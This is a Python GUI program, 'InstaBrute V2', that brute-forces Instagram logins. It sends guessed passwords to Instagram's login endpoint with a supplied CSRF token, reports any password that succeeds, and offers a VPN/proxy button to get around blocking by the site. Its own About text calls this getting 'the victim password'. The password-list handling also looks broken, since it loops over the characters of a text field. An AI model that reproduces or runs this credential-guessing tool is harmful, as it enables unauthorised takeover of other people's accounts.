
from PySide2.QtCore import *
from PySide2.QtWidgets import *
from PySide2.QtGui import *
import requests
import time
import os

class Core:
    def __init__(self, user_agent, csrf_token, x_requested_with, referer):
        self.user_agent = user_agent
        self.csrf_token = csrf_token
        self.x_requested_with = x_requested_with
        self.referer = referer

    def instabrute_passlist(self, username, password_list, timeout, output=None):
        start_time = time.time()
        url = 'https://www.instagram.com/accounts/login/ajax/'

        headers = {
            'user-agent': self.user_agent,
            'x-csrftoken': self.csrf_token,
            'x-requested-with': self.x_requested_with,
            'referer': self.referer,
        }

        for password in password_list:
            data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
            }
            response = requests.post(url, headers=headers, data=data)
            if 'authenticated":true' in response.text:
                if output:
                    output.appendPlainText(f"Found password: {password}")
                else:
                    print(f"Found password: {password}")
                return password
            elif time.time() > start_time + timeout:
                if output:
                    output.appendPlainText('Timeout reached. Could not find the correct password.')
                else:
                    print("Timeout reached. Could not find the correct password.")
                return None
            else:
                time.sleep(1)



class Widget1(QWidget):
    def __init__(self, parent=None):
        super(Widget1, self).__init__(parent)
        self.gui()

    def gui(self):
        self.w1 = self
        self.w1.setAutoFillBackground(True)
        self.w1.setWindowTitle("InstaBrute V2 By Mohamad Hani Janaty")
        self.w1.resize(580, 590)
        self.w1.setCursor(Qt.ArrowCursor)
        self.w1.setToolTip("")
        self.output1 = QPlainTextEdit(self.w1)
        self.output1.setPlainText("")
        self.output1.move(10, 340)
        self.output1.resize(560, 210)
        self.output1.setCursor(Qt.ArrowCursor)
        self.output1.setToolTip("")
        self.output1.setEnabled(False)
        self.tab1 = QTabWidget(self.w1)
        self.tab1.move(10, 0)
        self.tab1.resize(560, 330)
        self.tab1.setTabPosition(QTabWidget.North)
        self.tab1.setCursor(Qt.ArrowCursor)
        self.tab1.setToolTip("")
        self.ta1 = QWidget(self.tab1)
        self.ta1.setAutoFillBackground(True)
        self.ta1.setWindowTitle("")
        self.ta1.move(0, 0)
        self.ta1.resize(556, 303)
        self.ta1.setCursor(Qt.ArrowCursor)
        self.ta1.setToolTip("")
        self.username = QLineEdit(self.ta1)
        self.username.setText("")
        self.username.move(68, 16)
        self.username.resize(110, 22)
        self.username.setCursor(Qt.IBeamCursor)
        self.username.setToolTip("")
        self.label2 = QLabel(self.ta1)
        self.label2.setText("Username :")
        self.label2.move(8, 16)
        self.label2.resize(60, 22)
        self.label2.setCursor(Qt.ArrowCursor)
        self.label2.setToolTip("")
        self.passwordlist = QLineEdit(self.ta1)
        self.passwordlist.setText("")
        self.passwordlist.move(138, 46)
        self.passwordlist.resize(220, 22)
        self.passwordlist.setCursor(Qt.IBeamCursor)
        self.passwordlist.setToolTip("")
        self.label3 = QLabel(self.ta1)
        self.label3.setText("Drag Password List Here :")
        self.label3.move(8, 46)
        self.label3.resize(130, 22)
        self.label3.setCursor(Qt.ArrowCursor)
        self.label3.setToolTip("")
        self.start = QToolButton(self.ta1)
        self.start.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.start.setText("Start Attack")
        self.start.move(228, 246)
        self.start.resize(90, 22)
        self.start.setCursor(Qt.ArrowCursor)
        self.start.setToolTip("")
        self.start.clicked.connect(self.start_attack_bf)
        self.label4 = QLabel(self.ta1)
        self.label4.setText("User Agents :")
        self.label4.move(8, 76)
        self.label4.resize(70, 22)
        self.label4.setCursor(Qt.ArrowCursor)
        self.label4.setToolTip("")
        self.useragents = QLineEdit(self.ta1)
        self.useragents.setText("")
        self.useragents.move(78, 76)
        self.useragents.resize(440, 22)
        self.useragents.setCursor(Qt.IBeamCursor)
        self.useragents.setToolTip("")
        self.label5 = QLabel(self.ta1)
        self.label5.setText("CSRF Token :")
        self.label5.move(8, 106)
        self.label5.resize(70, 22)
        self.label5.setCursor(Qt.ArrowCursor)
        self.label5.setToolTip("")
        self.csrftokens = QLineEdit(self.ta1)
        self.csrftokens.setText("")
        self.csrftokens.move(78, 106)
        self.csrftokens.resize(440, 22)
        self.csrftokens.setCursor(Qt.IBeamCursor)
        self.csrftokens.setToolTip("")
        self.timeoutspin = QSpinBox(self.ta1)
        self.timeoutspin.setMinimum(0)
        self.timeoutspin.setMaximum(100)
        self.timeoutspin.setSingleStep(1)
        self.timeoutspin.setValue(0)
        self.timeoutspin.move(78, 136)
        self.timeoutspin.resize(40, 22)
        self.timeoutspin.setCursor(Qt.ArrowCursor)
        self.timeoutspin.setToolTip("")
        self.label6 = QLabel(self.ta1)
        self.label6.setText("TimeOut")
        self.label6.move(8, 136)
        self.label6.resize(50, 22)
        self.label6.setCursor(Qt.ArrowCursor)
        self.label6.setToolTip("")
        self.label7 = QLabel(self.ta1)
        self.label7.setText("Blocked By Instagram ?")
        self.label7.move(8, 166)
        self.label7.resize(110, 22)
        self.label7.setCursor(Qt.ArrowCursor)
        self.label7.setToolTip("")
        self.button2 = QToolButton(self.ta1)
        self.button2.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.button2.setText("Use Proxy")
        self.button2.move(8, 196)
        self.button2.resize(90, 22)
        self.button2.setCursor(Qt.ArrowCursor)
        self.button2.setToolTip("")
        self.button2.clicked.connect(self.start_proxy)
        self.tab1.addTab(self.ta1, "BruteForcer")
        self.ta2 = QWidget(self.tab1)
        self.ta2.setAutoFillBackground(True)
        self.ta2.setWindowTitle("")
        self.ta2.move(0, 0)
        self.ta2.resize(556, 303)
        self.ta2.setCursor(Qt.ArrowCursor)
        self.ta2.setToolTip("")
        self.image2 = QLabel(self.ta2)
        self.image2.setPixmap(QPixmap("Untitled.jpg"))
        self.image2.move(8, 16)
        self.image2.resize(121, 68)
        self.image2.setAutoFillBackground(True)
        palette = self.image2.palette()
        palette.setColor(self.image2.backgroundRole(), QColor(255, 255, 255, 255))
        self.image2.setPalette(palette)
        self.image2.setCursor(Qt.ArrowCursor)
        self.image2.setToolTip("")
        self.label8 = QLabel(self.ta2)
        self.label8.setText("InstaBrute Is a bruteforcing software used to bruteforce instagram accounts and get the victim password")
        self.label8.move(8, 96)
        self.label8.resize(520, 22)
        self.label8.setCursor(Qt.ArrowCursor)
        self.label8.setToolTip("")
        self.label9 = QLabel(self.ta2)
        self.label9.setText("the first version of program was created in 2022 but had some issues, how ever in this version i fixed all of it")
        self.label9.move(8, 116)
        self.label9.resize(530, 22)
        self.label9.setCursor(Qt.ArrowCursor)
        self.label9.setToolTip("")
        self.label10 = QLabel(self.ta2)
        self.label10.setText("Libraries Used")
        self.label10.move(8, 136)
        self.label10.resize(90, 22)
        self.label10.setCursor(Qt.ArrowCursor)
        self.label10.setToolTip("")
        self.label11 = QLabel(self.ta2)
        self.label11.setText("PySide2(QT) , Requests, InstaBrute Core")
        self.label11.move(8, 156)
        self.label11.resize(210, 22)
        self.label11.setCursor(Qt.ArrowCursor)
        self.label11.setToolTip("")
        self.label12 = QLabel(self.ta2)
        self.label12.setText("Created By Mohamad Hani Janaty")
        self.label12.move(8, 276)
        self.label12.resize(180, 22)
        self.label12.setCursor(Qt.ArrowCursor)
        self.label12.setToolTip("")
        self.label13 = QLabel(self.ta2)
        self.label13.setText("Licensed under GNU GPL 3")
        self.label13.move(8, 176)
        self.label13.resize(160, 22)
        self.label13.setCursor(Qt.ArrowCursor)
        self.label13.setToolTip("")
        self.tab1.addTab(self.ta2, "About Us")
        self.label1 = QLabel(self.w1)
        self.label1.setText("CopyRight HaniSoftwares 2019-2023")
        self.label1.move(10, 560)
        self.label1.resize(190, 22)
        self.label1.setCursor(Qt.ArrowCursor)
        self.label1.setToolTip("")
        return self.w1

    def start_attack_bf(self):
            user_agent = self.useragents.text()
            csrf_token = self.csrftokens.text()
            x_requested_with = 'XMLHttpRequest'
            referer = 'https://www.instagram.com/accounts/login/'
            core = Core(user_agent, csrf_token, x_requested_with, referer)
            core.instabrute_passlist(self.username.text(), self.passwordlist.text(), self.timeoutspin.value(), output=self.output1)

    def start_proxy(self):
        os.system("python vpn.py")
        self.output1.appendPlainText("VPN Opened Up. Now Login With Your VPNBook Account")





if __name__ == '__main__':
    import sys
    app = QApplication(sys.argv)
    a = Widget1()
    a.show()
    sys.exit(app.exec_())